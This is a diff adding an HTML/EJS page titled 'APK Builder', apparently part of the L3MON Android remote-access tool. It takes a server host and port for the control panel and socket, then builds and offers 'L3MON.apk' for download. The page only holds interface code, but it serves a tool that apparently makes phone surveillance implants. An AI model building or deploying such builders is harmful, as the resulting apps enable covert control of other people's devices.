@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html>
+
+<%- include('partials/head') %>
+
+
+<body>
+    <div class="ui container">
+    <%- include('partials/header') %>
+        <div class="ui segment">
+
+            <div id="dimmer" class="ui dimmer">
+                <div class="ui indeterminate text loader" id="loadingText">Starting build...</div>
+            </div>
+
+            <h1 class="ui" style="text-align: center">APK Builder</h1>
+            <div class="ui form" id="form">
+                <div class="inline fields">
+                    <div class="six wide field">
+                        <div class="ui labeled input">
+                            <div class="ui label">
+                                http://
+                            </div>
+                            <input type="text" id="uriInput" placeholder="IP / Public URL"
+                                title="This is the public url of your server (l3mon.domain.com)">
+                        </div>
+                    </div>
+                    <div class="two wide field">
+                        <label>:</label>
+                        <input type="number" id="portInput" placeholder="PORT" min="2048" max="65535"
+                            title="This is the server port used for both the panel and socket" value="<%= myPort %>">
+                    </div>
+
+                </div>
+                <div class="inline fields">
+                    <div class="eight wide field">
+                        <button id="gobuild" class="positive ui fluid button"><i class="wrench icon"></i>Build</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="ui form" id="download" style="display: none">
+                <div class="inline fields">
+                    <div class="eight wide field">
+                        <a class="blue ui fluid button" download="L3MON.apk" href="/build.s.apk"><i
+                                class="download icon"></i>Download</a>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+    <style>
+        .inline.fields {
+            justify-content: center;
+        }
+    </style>
+
+    <script>
+        var isDone = false;
+
+        function normalizeUri(uri) {
+            if (!uri) return '';
+            uri = uri.trim();
+            uri = uri.replace(/^https?:\/\//i, '');
+            uri = uri.replace(/\/$/, '');
+            return uri;
+        }
+
+        function validateInputs(uri, port) {
+            if (!uri) return 'Please enter a valid server host or IP.';
+            var p = parseInt(port, 10);
+            if (isNaN(p) || p < 2048 || p > 65535) return 'Please enter a port between 2048 and 65535.';
+            return null;
+        }
+
+        $('#gobuild').on('click', function (e) {
+            e.preventDefault();
+            var uri = normalizeUri($('#uriInput').val());
+            var port = $('#portInput').val();
+            var err = validateInputs(uri, port);
+            if (err) {
+                if (typeof showNotification === 'function') showNotification('#f03434', err);
+                return;
+            }
+
+            // Reset state and start loader
+            isDone = false;
+            $('#loadingText').text('Starting build...');
+            $('#dimmer').addClass('active');
+            var $btn = $('#gobuild');
+            $btn.addClass('disabled').prop('disabled', true);
+
+            build(uri, port, function done() {
+                // Re-enable after request completes (success or error handled inside)
+                $btn.removeClass('disabled').prop('disabled', false);
+            });
+            setTimeout(loaderText, 500);
+        });
+
+    var pollInterval;
+        function loaderText() {
+            // Start polling backend for real progress
+            function updateUIFromProgress(p) {
+                if (!p) return;
+                if (p.message) $('#loadingText').text(p.message);
+            }
+
+            function checkDone() {
+                if (isDone) {
+                    clearInterval(pollInterval);
+                    $('#dimmer').fadeOut(500, () => {
+                        $('#download').removeClass('active');
+                    })
+                    $('#form').fadeOut(500, () => {
+                        $('#download').fadeIn(200);
+                    })
+                }
+            }
+
+            pollInterval = setInterval(function () {
+                $.get('/builder/progress')
+                    .done(function (data) {
+                        if (data && !data.error && data.progress) {
+                            updateUIFromProgress(data.progress);
+                        }
+                        checkDone();
+                    })
+                    .fail(function () {
+                        // keep polling; UI will show last message
+                        checkDone();
+                    });
+            }, 400);
+        }
+
+        function build(URI, PORT, onComplete) {
+            $.post("/builder?uri=" + encodeURIComponent(URI) + "&port=" + encodeURIComponent(PORT))
+                .done(function (data) {
+                    if (data && !data.error) {
+                        isDone = true;
+                    } else {
+                        var msg = (data && data.error) ? data.error : 'Unknown error';
+                        if (typeof showNotification === 'function') showNotification('#f03434', msg);
+                        // Stop loader gracefully and hide dimmer
+                        try { clearInterval(pollInterval); } catch (e) { }
+                        $('#loadingText').text('Error: ' + msg);
+                        setTimeout(function () { $('#dimmer').removeClass('active'); }, 300);
+                    }
+                })
+                .fail(function (xhr) {
+                    var msg = 'Network error while building APK';
+                    if (typeof showNotification === 'function') showNotification('#f03434', msg);
+                    try { clearInterval(pollInterval); } catch (e) { }
+                    $('#loadingText').text('Error: ' + msg);
+                    setTimeout(function () { $('#dimmer').removeClass('active'); }, 300);
+                })
+                .always(function () {
+                    if (typeof onComplete === 'function') onComplete();
+                });
+        }
+
+    </script>
+    <%- include('partials/footer') %>
+</body>
+
+</html>
